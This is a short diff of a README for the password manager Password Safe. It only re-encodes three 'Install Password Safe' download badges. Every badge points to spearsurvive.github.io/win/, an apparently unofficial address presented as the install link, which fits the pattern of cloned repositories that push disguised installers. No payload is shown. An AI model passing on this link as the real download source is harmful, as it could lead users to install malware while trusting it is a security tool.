@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Password Safe](https://img.shields.io/badge/⬇_Install_Password%20Safe-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Password Safe](https://img.shields.io/badge/⬇_Install_Password+Safe-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Password Safe is a free, open-source password manager originally designed by sec
 
 <div align="center">
 
-[![⬇ Install Password Safe](https://img.shields.io/badge/⬇_Install_Password%20Safe-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Password Safe](https://img.shields.io/badge/⬇_Install_Password+Safe-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Password Safe is a free, open-source password manager originally designed by sec
 
 <div align="center">
 
-[![⬇ Install Password Safe](https://img.shields.io/badge/⬇_Install_Password%20Safe-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Password Safe](https://img.shields.io/badge/⬇_Install_Password+Safe-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
